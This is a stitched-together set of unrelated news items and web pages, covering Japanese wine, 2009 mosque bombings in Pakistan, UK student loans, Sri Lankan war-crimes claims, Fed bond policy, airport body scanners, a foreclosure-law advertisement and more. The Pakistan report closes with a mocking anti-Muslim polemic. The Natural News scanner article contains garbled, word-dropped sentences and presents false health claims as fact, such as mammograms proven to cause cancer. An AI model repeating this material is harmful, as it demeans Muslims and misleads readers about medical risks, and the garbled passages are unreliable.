Less than a decade ago , the mere mention of Japan would elicit puzzled looks , if not snorts of derision , from the global wine cognoscenti .
The country that gave the world premium sake and award - winning malt whiskies has been infamous for producing the kind of plonk that gives wine a bad name ‑ often blends of cheap imports and even grape juice .
But wine snobs are being forced to think again with the recent arrival in the US and Europe of labels from Japan made from 100 % domestically grown grapes .
Though it lacks the heritage of the great winemaking countries of Europe , Japan is hoping to emulate New Zealand and quickly prove its enological credentials .
That effort is centred on Yamanashi prefecture , where grape growing began 1,000 years ago , eventually spawning a modest wine industry in the second half of the 19th century .
The central region , where 90 wineries operate in the shadow of Mount Fuji , is now producing drinkable wines from chardonnay and other European grapes .
But it is the Koshu grape , an indigenous variety that found its way to Japan via central Asia and China more than a millennium ago , to which connoisseurs have turned for inspiration .
Yamanashi's fortunes received a boost in 2004 , when researchers found that the Koshu grape is more than 90 % vitis vinifera , part of the same European vine genus that gave us sauvignon blanc .
For Ernest Singer , president of Millésimes , a wine merchant based in Tokyo , it represented a crucial step towards realising a long - held dream of unleashing fine Japanese wine on the world 's drinkers .
After an encouraging foray into the US market in 2005 , Singer , whose firm owns several vineyards , turned the light - purple Koshu grapes into a wine that met strict EU regulations .
Amid a global boom in interest in Japanese food , Koshu is being touted as the perfect accompaniment to sushi's subtle flavours and delicate textures .
" Japan has the potential to be a major winegrowing region , " says Singer .
" It makes sense that Japan should have a viable wine export industry , when you consider that there are hundreds of Japanese restaurants in New York alone . "
His company 's Shizen 2006 , Cuvée Denis Dubourdieu , has won considerable critical acclaim since it appeared on the menu at Umu , a Michelin - starred Japanese restaurant in London , in February last year .
Millésimes has shipped 480 bottles to England , as well as 5,800 to perhaps the toughest market of all , France , since early 2008 .
The dry , fruity wine , containing just 10 % alcohol , was clearly to the liking of the legendary American critic Robert Parker , who described it as " crisp and pleasant and clearly meant to be a wine to guzzle with sushi or sashimi " .
Just as Japanese distillers learned how to make decent single malt by dispatching researchers to the Scottish Highlands , its winemakers are tapping into the expertise of their more accomplished foreign counterparts .
" By sending researchers to places like France and the US , we have managed to produce dry varieties that have received great reviews , " says Hirotoshi Naito , of industry support division of the Yamanashi prefectural government .
" We can't force people to drink our wine ; all we can do is tell them that Japan is serious about winemaking , and that the best labels come from Yamanashi . "
Yamanashi's marketing campaign will head to London in the middle of next month for a Koshu wine - tasting event that organisers hope will add to the list of exports to the EU , which currently comprises only Millésimes ' Koshu vintage and Cuvée Magrez - Aruga Koshu Isehara 2007 , from Yamanashi's Katsunuma Jozo winery .
Japan 's first commercial wineries appeared in the Meiji era ( 1868 - 1912 ) as part of the county 's attempts to westernise its agricultural base ; now it has more than 200 wineries are in a dozen regions , from Hokkaido in the far north to Miyazaki in the south .
" Like any other wine - producing country , Japan has some great wines and , frankly , some awful ones , " says Kunio Naito , managing director of Cave de Relax , a wine seller in Tokyo whose 1,600 - strong collection includes 200 labels from Japan .
" I can see a spurt in demand from Japanese restaurants in major cities , but you have to remember that in terms of exports , we are starting from scratch . "

`12,632 people dead and 12,815 injured ’.`380 killed in 8 attacks targeting mosques in 2009 ’ .
‘ Over 12,800 Islamic militants caught in 2009 ’ .

What these religious Muslims are doing ??

Most of the Muslims believe Islam as a Religion of Peace .
Most of them are also proud of it .
The actualities can be derived from the recent report published by Pak Institute for Peace Studies ( PIPS ) , a self acclaimed independent think - tank , under the title “ Pakistan Security Report 2009 ” .
Every proud Muslim have to ponder over the situation under Practical Islam of increasing violence and the deterrent development of Pakistan in all respect .
The report titled “ Pakistan Security Report 2009 ” released by Pak Institute for Peace Studies ( PIPS ) , an independent think - tank , said that compared to 313 operational attacks conducted in 2008 , 596 were carried out by security forces in 2009 .
As per the report published on last sunday , over 12,800 suspected militants , 75 of them belonging to Al Qaeda and 9,739 local Taliban or members of other banned groups , were arrested during operations conducted by law - enforcement agencies and armed forces across the country in 2009 .
“ If the casualties in terrorist attacks , operational attacks by the security forces and their clashes with the militants , inter-tribal clashes and the cross - border attacks of the US and Nato forces in Fata are counted , the overall casualties amount to 12,632 people dead and 12,815 injured . ”
In 2009 , the report says , 2,586 terrorist , insurgent and sectarian - related incidents were reported that killed 3,021 people and injured 7,334 .
The highest number of 1,173 attacks was reported from the NWFP , followed by 792 in Balochistan and 559 in Fata ; 46 attacks took place in Punjab , 30 in Sindh , 12 in Islamabad and five each in Gilgit - Baltistan and Azad Kashmir .
The Taliban seem to have changed their tactics and they are now carrying out coordinated attacks , instead of using a lone suicide bomber .
Part of that change was evident in choosing different and increasingly civilian targets , such as a university in Islamabad and markets in Lahore and Peshawar , the attack on the military ’s General Headquarters in Rawalpindi , and drive - by shootings targeting senior military officers in Islamabad .
Although the number of terrorist attacks and casualties increased in 2009 , the government forces were able to inflict heavy damage on terrorist networks and infrastructure in Fata and adjacent areas .
Earlier , as per a report of the Interior Ministry of Pakistan , it was conveyed that at least 380 innocent Pakistanis have been killed and 941 injured in the year 2009 in eight bloody incidents of terrorism across Pakistan , targeting mosques with the help of suicide bombers as well as explosive - laden vehicles .
“ According to the figures compiled by the Pakistani ministry of interior , 52 people were killed on average per month in the eight gory incidents , most of which were claimed by the Tehrik - e - Taliban Pakistan ( TTP ) .
On average , 33 people were killed every month in the mosque - related acts of terrorism in the first 11 months of the year 2009 .
The weekly and daily average for those killed during the same period comes to eight and one persons respectively .
The odious ploy of targeting jam - packed mosques at prayer time is now increasingly being used by the Tehrik - e - Taliban as this has become a lethal way to create horror .
According to the available data , over 50 mosques have been targeted since 9/11 either by the Pakistani Taliban or their like - minded jehadi groups like the Sipah - e - Sahaba Pakistan ( SSP ) , Lashkar - e- Jhangvi ( LeJ ) , Harkatul Jehadul Islami ( HUJI ) , Jaish - e- Mohammad ( JeM ) and Jamaatul Furqaan . “
Claiming responsibility for the Friday ’s mosque attack , the Tehrik - e - Taliban Pakistan ( TTP ) said the Parade Lane mosque was similar to Masjid - e - Zarrar that was built in Madina by the munafiqeen , and was “ demolished on the orders of Prophet Muhammad ( PBUH ) ” .
Talking to BBC after the attack , TTP commander Waliur Rehman Mehsud said that his men had actually attacked senior army officers .
“ Our militants attacked the military officers who were our primary target and we will continue to attack the army , ” he said , adding that the civilians killed in the attack were relatives of army personnel and their deaths “ did not matter ” .
The fatal mosque attack comes just a day after the attempted bombing of the Naval Headquarters in Islamabad .
According to the compilation of figures by the ministry of interior and sources of different news agencies , the first such incident took place on February 5 , 2009 when a suicide bomber blew himself at the main gate of Al Hussainia Mosque in Dera Ghazi Khan , killing 33 persons and injuring 54 others .
The second incident took place on March 27 , 2009 in which 92 persons , including 16 Security Force personnel , were killed and over 113 injured .
The target of the suicide bomber was a mosque at Peshawar - Torkham Highway in the Jamrud sub-division of the Khyber Agency in FATA during the Friday congregation .
The huge explosion reduced the single - storey roadside mosque to rubble .
The dead included the prayer leader , his brother , four personnel of the Frontier Corps and a dozen Khassadars ( tribal police ) .
The third such incident took place on June 5 , 2009 when a suicide bomber killed 57 worshippers , including 12 children , at a mosque in a remote village of the Dir Upper District of NWFP .
Dozens more were injured as a young man detonated explosives fastened to his body minutes before the Friday congregation in the Hayagay Sharqi village .
In the fourth incident that took place in the same month a week later on June 12 , 2009 , 12 worshippers were killed and 105 others sustained injuries when a suicide bomber rammed his explosives - laden van into a mosque during the Friday prayers in the Cantonment area of Nowshera in the NWFP .
The congregation was in the second Rakat ( part ) of their prayer when the bomber in the vehicle , carrying 125 kilograms of explosives , struck the wall of the mosque near the Army Supply Depot .
Two soldiers were among the four persons killed on the spot .
The fifth such incident took place on October 28 , 2009 when a remote - controlled car bomb killed at least 117 people , including women and children , and injured around 203 others .
The bombing completely destroyed Masjid Umme Habiba , a famous mosque of Peshawar , which was situated in the famous Meena bazaar .
At least 150 kilograms of explosives were used in the remote - controlled blast .
In the sixth incident on November 16 , 2009 , 12 persons were killed and 32 others sustained injuries in a suicide car bombing which targeted the Badaber Police Station and an adjacent mosque situated on the Kohat Road near Peshawar .
The powerful blast razed to the ground the mosque as well as a large portion of the Police Station .
The December 4 attack on the Rawalpindi mosque was the seventh such assault this year , specifically targeting mosques .
The December 4 , 2009 armed attack targeting the parade ground mosque in the garrison town of Rawalpindi , which killed 44 people including 17 children , was the latest in the series .
In one of the worst incidents of terrorism in recent years , a group of six fidayeen attackers belonging to the Tehrik - e - Taliban stormed the crowded Parade Land Askari Mosque close to the General Headquarters of the Pakistan Army during Friday prayers and sprayed gunfire at worshippers besides throwing hand grenades .
A serving major general of the Pakistan Army , a brigadier , two lieutenant colonels , a major and a number of soldiers were among those killed in a multi- pronged attack which was carried out in cold blood while violating the sanctity of a mosque by those who claim to be fighting for the glory of Islam .
The blood - spattered episode eventually came to an end after two suicide bombers blew themselves up .
The eighth such incident took place on October 28 , 2009 , when a suicide bomber rammed a car into a mosque during Friday prayer .
At least 13 people were killed and 40 other wounded when a suicide bomber blew himself up in a mosque situated in Khurshid Police Line , Temar Garah in North - West region of Pakistan .
The Islamists in Pakistan prefer explosion in Friday prayers in Mosques , mostly they enjoy bloodbath in Friday , they prefer blast among the children in school , in shopping mall , in un-alerted innocent Muslims in crowded place .
Obviously , all these are the signs of peace in Islam or the conspiracy of India , Israel or USA .
But all these under the total control of Great Allah through his Quranic doctrines .
Great indeed !!
Allah ho Akbar !!!
Allah ho Akbar !!!!

Next year 's applications have been delayed
The latest figures from the Student Loans Company suggest 28,000 people from England are still waiting to receive their loans and grants .
Another 38,000 still have applications in the pipeline , although nearly half of these have had most of their money .
The body , which runs the student support system for England , has been criticised in a report for the delays .
It is drawing up an action plan to tackle the problems , which will include a management shake - up .
The latest statistics from the Student Loans Company show more than a million applications for loans were made for this year - up in line with a 10 % increase in applications to universities .
Of these , 907,000 have been approved and 82,000 were withdrawn or not completed .
Applications are still coming in , as people can apply for a loan up to nine months after their courses start .
WHAT IS AVAILABLE , 2009 - 10 Tuition fee loan : up to £ 3,225 Maintenance loan : up to £ 3,564 non-means tested + up to £ 1,386 means tested Maintenance grant : £ 2,906 on household income below £ 25,000 tapers up to household income of £ 50,020 Maintenance loan reduced by 50 p for every £ 1 of grant Bursaries : determined locally Special Support Grant instead of maintenance grant of up to £ 2,906 for those eligible for means tested benefits ( loan not reduced )
When the problems came to wider public attention in October , the SLC made the decision to focus on giving all students who had applied by late August their basic entitlement to a loan - and to deal with the extra means - tested elements afterwards .
Among the 28,000 people still waiting for loans to be approved , the SLC says 5,000 are being processed but in the remaining 23,000 cases , " further information is required from sponsors " .
Among the 38,000 who have yet to receive all of their funds are 18,000 who have been given an " interim assessment " which means they will have had their basic loan paid , but not the means - tested element .
This is why students with disabilities and those applying for childcare support have been particularly affected .
The other 20,000 people in this category , the SLC says , are those whose applications have been approved but who still need to " make an online declaration " , before payment can be triggered .
Many of the thousands of people who have e-mailed the BBC News website since September have complained their documents were lost or mislaid by the loans agency .
The report into the delays , by Professor Sir Deian Hopkin , confirmed that technical problems with new equipment brought in this year to scan people 's documents had been partly to blame .
Next year 's applications had been postponed while the SLC looked at the lessons learned from this year 's problems but they have just been re-opened .
A statement from the SLC said : " The Department of Business , Innovation and Skills and the Student Loans Company are now satisfied that arrangements have been made to ensure that the processes are sufficiently robust so as to avoid a repeat of this situation next year and therefore the application cycle has now launched two months earlier than last year " .
New students can now begin applications for funding for 2010 / 11 as they apply for a place at university through Ucas .

A crack squad of London cops — three cars and a riot van — converged on a famous architectural photographer who was taking a picture of Christopher Wren 's 300 year old Christ Church spire .
Grant Smith , the photographer , refused to tell a Bank of America security guard what he was doing ( he was n't on B of A property ) and so the guard called in the police .
When the police arrived , Smith was searched and questioned under Section 44 of the Terrorism Act .
Last week , the Association of Chief Police Officers issued a stern warning to British police officers to stop using Section 44 to harass photographers , saying , " Photographers should be left alone to get on with what they are doing .
If an officer is suspicious of them for some reason they can just go up to them and have a chat with them – use old - fashioned policing skills to be frank – rather than using these powers , which we do n't want to over - use at all . "
Apparently , the message has n't been received .
City of London police said its response to Smith had been proportionate .
" When questioned by officers , the man declined to give an explanation and he was therefore informed that in light of the concerns of security staff and in the absence of an explanation , he would be searched under the Terrorism Act , " said a spokesman .
" After the man 's bag was searched , he explained he was a freelance photographer taking photos of buildings .
Once this explanation was received there was no further action . "
Police stop church photographer under terrorism powers

Six months after the Sri Lankan Government won its war with the Tamil Tigers , allegations are surfacing of war crimes committed in the final months of the conflict .
Last month the US Department of Homeland Security tried to question the Sri Lankan presidential candidate and US citizen , General Sarath Fonseka , about possible war crimes .
But the Australian Government has made no such moves to question a prominent dual Sri Lankan - Australian citizen about his activities .
In the last days of the civil war , it is alleged two political leaders of the rebel Tamil Tiger fighters were killed as they tried to lay down their arms and surrender .
The men led about a dozen men and women under a white flag to waiting Sri Lankan army troops .
A Tamil eyewitness said the soldiers fired on them with machine guns .
Everyone in the group was killed .
The incident is mentioned in a 2009 US State Department report to Congress , on possible violations of international humanitarian law in Sri Lanka , from January until the end of May this year .
The report says " the leaders , Nadesan and Puleedevan , spoke to international and domestic figures , who acted as intermediaries with the then foreign secretary , Dr Palitha Kohona , to negotiate a surrender .
Nadesan requested a UN witness but was told he had the Sri Lankan President 's guarantee of safety " .
Dr Kohona is now Sri Lanka 's ambassador to the United Nations .
He is also an Australian citizen and , according to Hansard , a former senior official with the Department of Foreign Affairs and Trade .
When asked what his role was in arranging the surrender , he told the ABC he had " no role in arranging anything " .
" Because I was in foreign ministry I had nothing to do with the defence ministry or the defence forces , and I do n't think anything was arranged anyway , " he said .
" I do n't think anybody else was involved in such a surrender either .
" There was an attempt to wake me up in the middle of the night , and I told them that I was not the person to contact about those demands .
" There was a general query about surrendering and I told them that I was the wrong person , that I had nothing to do with surrendering and asked them to go and deal with the matter in the way it ought to be dealt with . "
Three weeks after the shooting , Sri Lanka 's army chief General Sarath Fonseka was reported as saying the military had to overlook traditional rules of war and kill Tamil Tiger rebels who had come under white flags to surrender .
Calls for an investigation
Don Rothwell , professor of international law at the Australian National University , says as a diplomat Dr Kohona has immunity from prosecution , but recently international law courts have begun to question this principle in the case of possible war crimes .
" There 's nothing to suggest Dr Kohona was directly responsible for committing these alleged war crimes , though international law does recognise principles of what 's called command responsibility , where if someone had direct command , whether it 's legal or political , with respect to the commission of these types of offences , " he said .
Mr Rothwell says in this case , there is enough material to launch a preliminary investigation .
" Dr Kohona is a dual Australian - Sri Lankan citizen .
The fact that he is an Australian citizen automatically activates obligations for Australia to investigate this matter at the legal level , but the fact that he was a former high - profile official for the Australian Government representing Australia in international negotiations , I think perhaps places an even stronger responsibility on Australia to at least conduct the initial investigations into this matter , " he said .
Mr Kohona says the allegations " first and foremost ... need to be substantiated [ and ] no country goes around investigating silly accusations based on innuendo and unsubstantiated facts " .
Both the Federal Government and the Australian Federal Police ( AFP ) say they are aware of the US State Department 's report .
The AFP says it has not received any referral to investigate Dr Kohona for alleged war crimes .
A spokesman for the Attorney - General 's Department says investigation and prosecution by the country in which criminal conduct occurred is the most appropriate way to bring an alleged war criminal to justice .

I 've played enough characters that there are one or two I 've forgotten the names of , including a slug psychologist in Starlight Rendezvous , and a random Dragonlord in Dragon II .
Preferred Character Types
I consider myself a skilled and veteran player suitable for major and even leading roles — in fact my success tends to be directly proportional to my degree of involvement in major plot lines .
` Spear - carrier ' roles make me feel cramped and unhappy and I usually flub them .
This is not exactly because I have ham tendencies ( though I do ) it 's that I do n't find small roles much of a challenge any more .
The pattern in most of the characters I have played best and enjoyed most is that they are all types who get their leverage from intelligence and puzzle - solving ability — high - level scientist or sorcerer types .
One of them , ` The Brain ' , made me the runner - up for the `Best Player ' award in the first Ace Of Spades game at Balticon ( and achieved all his character goals in his second appearance at the Floating Vagabond ) .
Another ( Dr. John Myriad ) saved the planet Earth twice — once in Rekon - 1B ( my first game ) and again in Rekon +10 , a decade later .
In the last decade , however , I have been doing more in the way of pure dramatic roleplaying .
My Cyrano de Bergerac in King 's Musketeers II barely met a single one of his goals , but was much praised during and after the game for sheer melodramatic intensity ( not to mention being showered with style points by the Cruel Hoax referees , not an easy crowd to impress ) .
My preference is to play a ` Good ' or ` Neutral ' character , but I would play a villain if necessary to get a stronger part .
Usually I 'd rather play an independent than a faction follower or even leader .
When intriguing , I do a lot of win - win negotiating and often find myself in a pivot or power - broker position between several factions ( I do have some `schemer ' tendencies , though I usually prefer not to play pure schemer characters ) .
My playing style is also marked by the fact that I almost never lie to anyone , preferring to find ways to make the truth serve my ends ( by misdirection , if necessary ) .
Many game forms oppose `character acting ' against `strategic success ' .
For me , the two are n't separable .
All my `winning ' characters have been intensely character - acted ; conversely , when I 've been handed a character that I could n't method - act my way into I 've generally crashed and burned .
Give me a character that fits and a little rope and I 'll generate as much drama as you could ask for .
Skills and Interests Relevant to Live - Action Gaming
I have an extensive knowledge base in the sciences and history .
I have a lot of experience at table gaming ( military simulations , combinatorial games , etc. ) and play them with some skill .
If your game has a real military simulation in it , you want me as one of the generals , and it would be unwise to put me on any side you want to lose .
I have good public - speaking skills and can hold an audience .
I am a fairly able poet and can extemporize in any one of several genres at short notice , including but not limited to : ballad , limerick , haiku , and alliterative heroic meter .
I am very good at word puzzles ( incomplete word recognition , crosswords , cryptograms , anagrams , that sort of thing ) .
I play flute , guitar , and hand drums .
I hold the rank of 1st Dan Black Belt in Tae Kwon Do , and am a student of aikido ; accordingly I have considerable skill in hand - to - hand and weapons techniques , including sword and nunchaku , and am a good shot with a pistol .
While the skills are not directly relevant in - game , the background does make me more convincing at playing warrior / assassin / spy - type characters .
I am an expert computer programmer and Internet technologist .

NEW YORK ( Reuters ) -
The end of the Federal Reserve ’s program to buy mortgages backed by Fannie Mae and Freddie Mac could have a ripple effect on the market for U.S. government bonds .
Once the Fed stops buying mortgage - backed securities at the end of March , private buyers will need to step in and take over in a market that the government has propped up since the financial crisis reached its peak .
But they wo n’t want to buy MBS unless the securities offer a better return than the current rate , so mortgage rates will likely rise .
Higher rates could , in turn , spur a hedging practice in the Treasury market that has been largely absent in recent months .
As a result , longer - dated U.S. debt could cheapen and yields could climb .
A jump in yields would increase the cost of borrowing for the U.S. government .
The cost of mortgages would also rise , threatening the fragile housing recovery .
And a sharp , sudden spike in Treasury yields could spook regular government debt buyers such as foreign central banks .
Some signs in the marketplace are already pointing to this possibility .
The Treasury yield curve has steepened and the prices of bond options have risen .
“ Some feel that the recent market moves reflect investor positioning for the end of several unconventional Fed facilities , ” said Mohamed El - Erian , co-chief investment officer at Pacific Investment Management Co. , in an e-mail .
VOLATILITY TO RETURN
Treasury strategists have also warned that wider swings in bond prices lie ahead .
They will be driven in part by hedging practices MBS investors are known to use that the Fed , as the largest MBS buyer since the financial crisis began , did not employ .
“ In essence , the Fed has taken a lot of volatility out of the marketplace , ” said William O’Donnell , the head of U.S. Treasury strategy at RBS Securities in Stamford , Connecticut .
“ Any subsequent mortgage issuance is likely to fall into the hands of portfolios likely to be somewhat dynamically more hedged .
It ’ll have the prospect and almost the certainty of adding volatility back into the rates markets . ”
The practice is known as convexity hedging .
Investors holding MBS can actually find themselves losing money if mortgage or interest rates rise suddenly and they cannot get rid of their lower - yielding securities .
They often try to offset unexpected increases in mortgage and interest rates by selling Treasury notes .
“ If you look at option prices presently , we have the implied volatility for longer - dated options trading 25 percent over their long - term historical levels .
One could argue the reason for this is that people anticipate uncertainty after March 31 end date of the Fed ’s MBS program . ” said Harley Bassman , a managing director at Bank of America Merrill Lynch .
“ People are concerned about what might happen when the Fed starts to drain liquidity .
This is why the volatility surface is so steep from one month to two years expiries . ”
BEWARE OF CONVEXITY
Convexity hedging often feeds on itself , causing Treasury yields to rise even faster .
Ajay Rajadhyaksha , head of U.S. fixed income and securitized products research at Barclays Capital in New York , said if rates rise sharply , agency MBS could extend and trade to much longer durations .
“ It is not a risk for the next 30 basis points or so in interest rates , but at a 4.10 percent ( 10 - year ) Treasury yield , the market will start to worry , ” he said .
Arthur Frank , director and head of MBS research at Deutsche Bank Securities in New York , said while a 4 percent
Treasury yield could spark a big pick - up in convexity hedging , he noted that hedging by mortgage servicers , the banks that manage mortgage loans and collect payments from borrowers , is driven more by MBS prices .
“ Servicers have varied trigger points , but it is safe to say , they might start selling mortgage duration at 99 - 1 / 2 or at 99 , ” he said .
The Fannie Mae 30 - year 4.50 percent coupon is priced at 100 - 8/32 , with a yield of 4.438 percent .
The relationship between interest rates and MBS prepayment rates directly influences MBS pricing .
More mortgage borrowers are likely to quickly pay off their old loans when interest rates are low and they can get a better deal by refinancing .
In a bond market rally , prepayment rates rise , reducing the price gains of MBS , while in a bear market , prepayment rates slow , resulting in increased price losses .
This price movement is commonly referred to as “ negative convexity . ”
This week , the final phase of the atheist bus campaign will appear in London , Edinburgh , Cardiff and Belfast – not on buses , but on billboards .
Due to the amazing sums donated to the campaign fund by many Cif readers at the end of last year , we raised enough for a second wave of adverts – and the above posters will launch today .
When , in this Cif piece back in October 2008 , we asked how the extra funds should be spent , one of the issues which came up repeatedly in the comments concerned the growth of of faith schools in the UK and the segregation of children according to their parents ' beliefs .
Many of you felt strongly that children should be given the freedom to decide which belief system they wanted to belong to , if any , and that they should not have a religion decided for them .
Commenter Finite187 wrote , " A campaign against faith schools would be good as a next step , " ciderpower said " You could address faith schools – religions want schools for the few , not for all " and 555555 asked , " How is this distortion of school education happening in this country ? "
The atheist campaign team shared this point of view .
However , rather than using adverts to try and campaign politically , we thought it would be more beneficial to try and change the current public perception that it is acceptable to label children with a religion .
As Richard Dawkins states , " Nobody would seriously describe a tiny child as a ' Marxist child ' or an ' Anarchist child ' or a ' Post - modernist child ' .
Yet children are routinely labelled with the religion of their parents .
We need to encourage people to think carefully before labelling any child too young to know their own opinions , and our adverts will help to do that . "
We have scheduled the launch of the billboards to take place during the same week as Universal Children 's Day ( 20 November ) , which is the United Nations ' " day of worldwide fraternity and understanding between children " .
We hope the advert 's message will encourage the government , media and general public to see children as individuals , free to make their own choices as soon as they are old enough to fully understand what these choices mean , and that they will think twice before describing children in terms of their parents ' religion in the future .
Lastly , I 'd like to take a final opportunity to thank everyone who donated to the campaign , supported it , commented on it or blogged about it – you really did make a difference to public discourse in this country and around the world .
We hope you feel the new poster campaign is worthwhile and effective .
After this phase , I will be taking a step back from atheist campaigning and returning to journalism .
For those of you would like to continue to donate to campaigns on this issue , the BHA have launched a new pro-inclusive schools initiative here .

Geometric Visual Hallucinations Jack Cowan Date : January 17 , 2006 Run Time : 1 hours 07 minutes Speakers : Jack Cowan Topics : DOWNLOAD Audio : 50.mp3
Jack Cowan is Professor of Mathematics and Neurology at The University of Chicago .
His research is concerned with understanding how circuits in the visual cortex process information , which he uses mathematics to investigate .
Cowan developed a neural field theory with H.R. Wilson and then showed how to use nonlinear stability theory to analyze how patterns of stable activity could arise in neural networks .
The Obama administration has asked the Department of Justice to dismiss a lawsuit brought by convicted terrorist Jose Padilla against torture memo author John Yoo , asserting that Yoo cannot be sued for legal opinions he offered in the course of advising then - President Bush on national security matters .
Constitutional law professor Jonathan Turley finds ths decision inexplicable .
“ The president literally has gotten onto a plane this evening to go to Norway , ” he told MSNBC ’s Keith Olbermann on Wednesday , “ to accept the Nobel Prize , while his Justice Department is effectively gutting a major part of Nuremberg . ”
ADVERTISEMENT
“ The Obama administration is arguing not only that they should n’t be prosecuted , ” Tuirley emphasized , “ but it ’s now saying that you should n’t even be able to sue them civilly .
…
It ’s an international disgrace . ”
Turley pointed out that several legal advisors to Germany ’s Ministry of Justice were convicted during the Nuremberg trials held after World War II for providing the legal advice that justified Nazi war crimes .
Now the Obama administration , in its desire to uphold executive privilege at any cost , is willing to toss that principle aside .
“ There is no limiting principle here , ” Turley explained .
“ John Yoo was essential to this torture program . …
If John
Yoo can not not be sued for an alleged war crime , what possibly could a Justice official be sued for ? …
We ’re talking about the most extreme case . ”
“ The Justice Department ’s prosecuted lawyers who give advice to mobsters , ” Turley concluded , “ but apparently if you give advice to advance a war crime , that ’s just ‘ full and frank advice . ' ”

Never approved as safe for humans
Could these scans cause cancer and birth defects ?
Radiology experts claim full - body scanners are safe
Resources :
( Natural News )
In researching the biological effects of theused for whole body imaging at airports , NaturalNews has learned that the energy emitted by the machinesMillimeter wave machines represent one of two primary technologies currently being used for the " digital strip searches " being conducted at airports around the world .
" The Transportation Security Administration utilizes two technologies to capture naked images of air travelers - backscatter x-ray technology and millimeter wave technology , " reports the , a non-profit currently suing the U.S. government to stop these electronic strip searches .
( http://epic.org/privacy/airtravel/backscatte...
In order to generate the nude image of the human body , these machines emit -- high - frequency energy " particles " that can pass through clothing and body tissue .
The manufacturers of such machines claim they are perfectly safe and present no health risks , but a study conducted by Boian S. Alexandrov ( and colleagues ) at theshowed that these terahertz waves could " ... unzip double - stranded DNA , creating bubbles in the double strand that could significantly interfere with processes such as gene expression and DNA replication .
"
In layman 's terms , any time you 're talking about interfering with " gene expression " and " DNA replication , " you 're essentially talking about something that could be a risk to human health .
" At first glance , it 's easy to dismiss any notion that they can be damaging , " reports TechnologyReview.com ( http://www.technologyreview.com/blog/arxiv/2... ) .
" But a new generation of cameras are set to appear that not only record terahertz waves but also bombard us with them .
And if our exposure is set to increase , the question that urgently needs answering is what level of terahertz exposure is safe .
" And yet no such long - term safety testing has ever been conducted by a third party .
There have beenindicating that multiple exposures to such terahertz waves , accumulated over a long period of time , are safe for humans .
The FDA , in particular , has never granted its approval for any such devices even though these devices clearly qualify as " medical devices . "
( If you try to sell an X - ray imaging device yourself , without FDA approval , you 'll be arrested .
So why do these TSA suppliers get away with selling human body imaging equipment that has never been adequately safety tested or approved by the FDA ? )
The study cited in the Technology Review article mentioned above is visible at : http://arxiv.org/abs/0910.5294
There , study authors conclude : " Based on our results we argue that a specific terahertz radiation exposure may significantly affect the natural dynamics of DNA , and thereby influence intricate molecular processes involved in gene expression and DNA replication .
"
In other words , Could these scans cause infertility ?
Cancer ?
Shortened lifespan ?
We do n't yet know the answers to these questions , but then again .
This technology is beingwithout adequate safety testing that would prove it safe for long - term use .
How many times in the past have the " experts " told us technologies were perfectly safe and then later we found out they were dangerous ?
X - Rays were once used in shoe stores to see if new shoes would fit the bone structure of your feet .
High - voltage power lines are perfectly safe , we 're told -- but then why do children who live closer to those lines have higher rates of cancer ?
Dentistsclaim that mercury fillings are perfectly safe for your health -- a preposterous notion -- and cell phone companies continue to insist that cell phone radiation is n't hazardous to your health at all .
Time and time again , during the roll - out of some new technology .
Why should we believe that full - body scanners are safe when they 've never been proven safe ?
Furthermore , there is now reason to believe they may damage human DNA .
What if the experts are wrong about their safety and ten years later we find out that there isthat causes infertility and cancer ?
What if air travelers who subject themselves to this radiation wind up suffering some currently - unknown health condition as a result ?
At no time in the history of human civilization have large numbers of humans ever been subjected to terahertz bombardment of this type and frequency .
Sure , you can argue that you get more radiation sitting in an airplane at high altitude than you get from a full - body scanner , or you can explain that cell phones emit far more radiation on the whole ( which they do , when you 're talking on them anyway ) .
But if there 's one thing we all should have learned about radiation by now it 's that .
The terahertz frequencies have never been rolled outin a scanning technology .
Who 's to say they 're going to be safe ?
What about pregnant women ?
Can the TSA absolutely guarantee that these full - body scanners wo n't damage the DNA of the unborn babies ?
What if this technology becomesand ten months from now women start giving birth to mutant babies who were damaged by terahertz radiation ?
I'm not saying this is going to happen , but would n't it be wise to determine the safety of this technology
As theadmitted in a 2002 report that studied these security devices : ( http://www.fda.gov/ohrms/dockets/AC/03/briefing/3987b1_pres-report.pdf)Barring solid evidence of the safety of this terahertz - emitting technology , the TSA would be wise to followwhich states that we should err on the side of caution when it comes to the roll out of new technologies .
Unfortunately , the TSA appears to be erring on the side of stupidity by subjecting the public to an unproven , " experimental " technology with unknown long - term effects on human DNA .
And here 's the real kicker : because they can't detect powder explosives in the first place .
A determined terrorist can hide all sorts of powder in a shoe , or a sleeping pillow , or a plastic bag sewn into the side of his carry - on luggage .
There are a thousand places for terrorists to hide explosives that wo n't be caught on full - body scanners , no matter how detailed the images are .
Besides , in order to avoid engaging in child pornography ( because these machines offer very detailed depictions of body parts ) , the rules will allow people under 18 years of age to bypass them .
So all you need then , if you 're a terrorist , iswho can pack explosives in his own underwear .
Radiology experts are claiming that the radiation emitted from these full - body scanners is perfectly safe for you .
Then again , , and recent science has now proven that mammograms cause cancer .
When it comes to radiation safety , .
They say all that radiation is safe for YOU , but then they flee the room when the X - rays are turned on , ever notice that ?
They really have zero credibility when talking about the long - term safety of medical imaging devices .
Most doctors , similarly , do n't have any real clue how much radiation is emitted by a CT scan !
As BusinessWeek reports : ( http://www.businessweek.com/lifestyle/content/healthday/634724.html)The New York Times adds : ( http://www.nytimes.com/2010/01/09/health/09scanner.html)NYT goes on to state that the TSA has entered into a contract under which it could purchaseto be deployed in airport all across the country . , January 8 , 2010http://arxiv.org/abs/0910.5294Technology

If you have been served with a foreclosure complaint , you will probably want to hire an attorney right away .
In the state of Florida , you only have 20 days to respond to this notice .
It could be critical to meet with a knowledgeable lawyer to discuss the legal options available to you .
At the Miami law office of Kingcade Garcia McMaken , we handle foreclosure defense throughout the state of Florida .
We can help you .
Contact us today .
We will take immediate action , striving to avoid foreclosure and save your home .
What You Need To Know
Foreclosure is an action by the bank to take back your property .
You have the right to fight that action .
Banks must take specific steps , in the correct order , with the correct timing , in order to have the right to foreclose .
Without hiring an attorney , you may not know whether the bank has done the foreclosure correctly .
Additionally , almost all mortgages in the state of Florida have the right of “ reinstatement . ”
This means that , if at any time during the foreclosure litigation process the borrower comes up with the money for the late payments or can make a deal with the bank to cure the arrearages or late payments , legally the bank must dismiss the foreclosure action .
Many people feel very overwhelmed when they get sued for foreclosure — they move out of the house or sign the house over , not knowing that by hiring an attorney and fighting this action , it is very possible to save the house , even without filing bankruptcy .
We Take Your Situation Seriously
At Kingcade Garcia McMaken , we take foreclosure cases very seriously .
We understand that nothing is more debilitating to a family than the loss of its home .
It is far and away most families ’ biggest asset and the one that provides the most stability .
